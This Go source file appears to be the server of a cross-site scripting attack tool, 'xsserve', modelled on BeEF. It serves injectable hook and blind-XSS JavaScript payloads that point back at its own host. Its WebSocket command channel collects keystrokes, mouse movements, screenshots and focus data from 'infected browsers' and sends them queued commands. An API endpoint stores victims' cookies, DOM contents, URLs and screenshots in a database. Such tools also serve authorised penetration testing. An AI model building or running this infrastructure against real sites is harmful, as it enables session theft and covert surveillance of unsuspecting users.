package server

import (
	"bytes"
	"crypto/rand"
	"crypto/rsa"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/base64"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"log"
	"math/big"
	"net/http"
	"strconv"
	"strings"
	"time"

	"github.com/gorilla/websocket"

	"xsserve/core"
	"xsserve/database"
)

var upgrader = websocket.Upgrader{
	ReadBufferSize:  512,
	WriteBufferSize: 512,
	CheckOrigin:     func(r *http.Request) bool { return true }, // should eventually fix this to loop over allowed origins, AKA, triggered hooks hosts. To only allow infected hosts to call back. true for true YOLOers
}

func ServeXSS(currentFlags *core.Flags) (err error) {
	flags = currentFlags

	mux := http.NewServeMux()

	//redirectHandler := http.RedirectHandler("http://example.org", 307)
	//mux.Handle("/foo", rh)
	//notFoundHandler := http.NotFoundHandler()
	hook := http.HandlerFunc(hookHandle)
	hookws := http.HandlerFunc(hookWSHandle)
	blind := http.HandlerFunc(blindHandle)
	custom := http.HandlerFunc(customHandle)
	api := http.HandlerFunc(apiHandle)

	// Beef-like hook payload and endpoint
	mux.Handle("/hook", hook)
	mux.Handle("/h", hook)
	mux.Handle("/ws", hookws) //web socket endpoint
	mux.Handle("/w", hookws)

	// Blind XSS payload
	mux.Handle("/blind", blind)
	mux.Handle("/b", blind)
	mux.Handle("/", blind)

	// Custom JS payload
	mux.Handle("/custom", custom)
	mux.Handle("/c", custom)

	mux.Handle("/api", api)
	mux.Handle("/a", api)

	//TODO: fix, The script from “http://host/static/resources/ui/js/main.js” was loaded even though its MIME type (“text/plain”) is not a valid JavaScript MIME type.
	//mux.Handle("/static/", http.StripPrefix("/static/", http.FileServer(http.FS(StaticFS))))

	//TODO: check if HTTPS, then serve over TLS otherwise HTTP
	//TODO: if no certificates provided and HTTPS is enabled generate certificates
	_, err = tls.LoadX509KeyPair(flags.HTTPSCert, flags.HTTPSKey)
	safeFallback := false
	if err != nil && flags.IsHTTPS {
		log.Println("Certificate or key file not found or invalid:", err)
		safeFallback = true
	}

	server := &http.Server{
		Addr:           fmt.Sprintf("%s:%d", flags.XSSAddress, flags.XSSPort),
		Handler:        mux,
		ReadTimeout:    10 * time.Second,
		WriteTimeout:   10 * time.Second,
		MaxHeaderBytes: 1 << 20,
	}

	if flags.IsHTTPS && !safeFallback {
		err = server.ListenAndServeTLS(flags.HTTPSCert, flags.HTTPSKey)
	} else if flags.IsHTTPS && safeFallback {
		// Generate a key pair from your pem-encoded cert and key ([]byte).
		log.Println("Generating fallback self-signed certificate...")
		keyBytes, certBytes, err := GenerateX509KeyPair(flags.Domain)
		if err != nil {
			log.Fatal(err)
			return err
		}

		cert, err := tls.X509KeyPair(certBytes, keyBytes)
		if err != nil {
			log.Fatal(err)
			return err
		}

		// Construct a tls.config
		tlsConfig := &tls.Config{
			Certificates: []tls.Certificate{cert},
		}
		server.TLSConfig = tlsConfig

		err = server.ListenAndServeTLS("", "")
		if err != nil {
			return err
		}
	} else {
		err = server.ListenAndServe()
	}

	return err
}

func hookWSHandle(w http.ResponseWriter, r *http.Request) {
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Println(err)
	}

	//TODO: set online everytime we receive an heartbeat, if not heartbeat for more than X duration, its dead.
	//TODO: also have a page for "infected browsers" instead of just triggers? Like beef?
	//TODO: if same browser fingerprint matches, then reestablish existing connection?
	//TODO: expose generic realtime communication channel for plugins
	for {
		// Read message from browser
		msgType, msg, err := conn.ReadMessage()
		if err != nil {
			return
		}

		var data core.PollRequestJSON
		err = json.Unmarshal(msg, &data)
		if err != nil {
			return
		}
		if data.UID == "" {
			continue
		}
		//Parse PollRequestJSON to TriggerCommand
		/*if data.Poll == "heartbeat" {
			//1. GET TRIGGER/BROWSER BY UID
			//2. Set ONLINE status
		}*/
		//TODO: make this a real feature with DB and stuff...
		//fmt.Printf("%s sent: %s\n", conn.RemoteAddr(), msg)
		fmt.Printf("UID: %v (%v) sent: action_results=%v spydata.image=%v spydata.keys=%v spydata.mouse=%v spydata.focused=%v\n",
			data.UID,
			conn.RemoteAddr(),
			data.ActionResults,
			len(data.SpyData.Image) > 0,
			data.SpyData.Keyboard,
			data.SpyData.MouseCoords,
			data.SpyData.FocusedElement,
		)
		var frame []byte
		_, err = base64.StdEncoding.Decode(frame, data.SpyData.Image)
		if err != nil {
			log.Println(err)
		}

		//SEND commands
		trigger := core.Trigger{UID: data.UID}
		commands, err := database.GetCommandsForTrigger(&trigger)
		if err != nil {
			log.Println(err)
			return
		}

		jsonCommands, err := json.Marshal(commands)
		if err != nil {
			log.Println(err)
			return
		}

		// Write message back to browser
		if err = conn.WriteMessage(msgType, jsonCommands); err != nil {
			return
		}

		//TODO: properly implement a way to check if command has been executed instead of deleting all SENT commands
		database.DeleteTriggerCommands(&trigger)
	}
}

func hookHandle(w http.ResponseWriter, r *http.Request) {
	log.Println("[HOOK] Received request from", r.Host)

	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept")
	w.Header().Set("Content-type", "text/javascript")
	hook, err := StaticFS.ReadFile("resources/xss/hook.js")
	if err != nil {
		log.Println("Could not locate hook.js file:", err)
		log.Println(r)
		return
	}

	var protocol, endpoint string
	protocol = "http"
	if flags.IsHTTPS {
		protocol = "https"
	}
	endpoint = flags.XSSAddress
	if flags.Domain != "" {
		endpoint = flags.Domain
	}
	hook = bytes.ReplaceAll(hook, []byte("[[HOST_REPLACE_ME]]"), []byte(fmt.Sprintf("%v://%v:%v", protocol, endpoint, flags.XSSPort)))

	_, err = w.Write(hook)
	if err != nil {
		log.Println("Failed to write response:", err)
	}
}

func blindHandle(w http.ResponseWriter, r *http.Request) {
	log.Println("[BLIND] Received request from", r.Host)

	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept")
	w.Header().Set("Content-type", "text/javascript")
	blind, err := StaticFS.ReadFile("resources/xss/blind.js")
	if err != nil {
		log.Println("Could not locate blind.js file: ", err)
		log.Println(r)
		return
	}

	var protocol, endpoint string
	protocol = "http"
	if flags.IsHTTPS {
		protocol = "https"
	}
	endpoint = flags.XSSAddress
	if flags.Domain != "" {
		endpoint = flags.Domain
	}

	// TODO: use go templates instead?
	blind = bytes.ReplaceAll(blind, []byte("[[HOST_REPLACE_ME]]"), []byte(fmt.Sprintf("%v://%v:%v", protocol, endpoint, flags.XSSPort)))

	_, err = w.Write(blind)
	if err != nil {
		log.Println("Failed to write response: ", err)
	}
}

func customHandle(w http.ResponseWriter, r *http.Request) {
	//TODO: based on a special id parameter injected in the blind payload script, this will load a different script
	log.Println("[CUSTOM] Received request from", r.Host)

	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept")
	w.Header().Set("Content-type", "text/javascript")
	custom := []byte("alert('custom')")

	_, err := w.Write(custom)
	if err != nil {
		log.Println("Failed to write response: ", err)
	}
}

func apiHandle(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept")

	// Ignore OPTIONS or GET
	if r.Method == "OPTIONS" || r.Method == "GET" {
		return
	}

	log.Println("[API] Received data from trigger via", r.Method, "from:", r.RemoteAddr)
	//parse parameters
	var j map[string]string

	err := json.NewDecoder(r.Body).Decode(&j)
	defer r.Body.Close()
	if err != nil {
		log.Println("Failed to decode body:", err)
	}

	//TODO: this is VERY fugly code, rework it to be nicer from the json into the core.Trigger struct
	// Parse Cookies header
	var t core.Trigger
	header := http.Header{}
	header.Add("Cookie", j["Cookies"])
	request := http.Request{Header: header}
	t.Cookies = request.Cookies()

	t.Date = time.Now()
	browserDate, err := strconv.ParseInt(j["BrowserDate"], 10, 64)
	if err != nil {
		log.Println("Failed to decode BrowserDate:", err)
	}
	t.BrowserDate = time.Unix(browserDate/1000, 0) // Manually convert to seconds... so we /1000

	/*TOOD: perform query to get Payload id from Code*/
	t.Payload = core.Payload{Code: j["Payload"]}

	t.UID = j["UID"]
	t.Host = j["Host"]
	t.URI = j["URI"]
	t.Referrer = j["Referrer"]
	t.UserAgent = j["UserAgent"]
	t.Origin = j["Origin"]
	t.DOM = j["DOM"]
	t.RemoteAddr = r.RemoteAddr

	// Save the image as bytes so we can serve it later via /get/screenshot
	b64data := j["Screenshot"][strings.IndexByte(j["Screenshot"], ',')+1:]
	t.Screenshot, err = base64.StdEncoding.DecodeString(b64data)
	if err != nil {
		log.Println("Failed decoding image:", err)
	}
	//log.Println(j)
	//log.Println(b64data)
	//log.Println(t.Screenshot)
	//log.Println(r.Body)
	// Insert trigger to DB
	_, err = database.InsertTrigger(&t)
	if err != nil {
		log.Println("Failed to insert into database:", err)
		return
	}

	log.Println("[DB] Inserted trigger into db:", t)
}

func GenerateX509KeyPair(hostname string) (priv []byte, pub []byte, err error) {
	privatekey, err := rsa.GenerateKey(rand.Reader, 4096)
	if err != nil {
		return nil, nil, err
	}
	publickey := &privatekey.PublicKey

	privateKeyBytes := x509.MarshalPKCS1PrivateKey(privatekey)
	privateKeyBlock := &pem.Block{
		Type:  "RSA PRIVATE KEY",
		Bytes: privateKeyBytes,
	}

	max := new(big.Int)
	sn, err := rand.Int(rand.Reader, max.Exp(big.NewInt(2), big.NewInt(130), nil).Sub(max, big.NewInt(1))) //TODO: verify this is secure...
	if err != nil {
		return nil, nil, err
	}

	tml := x509.Certificate{
		NotBefore:    time.Now(),
		NotAfter:     time.Now().AddDate(1, 0, 0),
		SerialNumber: sn,
		Subject: pkix.Name{
			CommonName:   hostname,
			Organization: []string{"n/a"},
		},
		BasicConstraintsValid: true,
	}

	cert, err := x509.CreateCertificate(rand.Reader, &tml, &tml, publickey, privatekey)
	if err != nil {
		return nil, nil, err
	}

	publicKeyBlock := &pem.Block{
		Type:  "CERTIFICATE",
		Bytes: cert,
	}

	return pem.EncodeToMemory(privateKeyBlock), pem.EncodeToMemory(publicKeyBlock), err
}
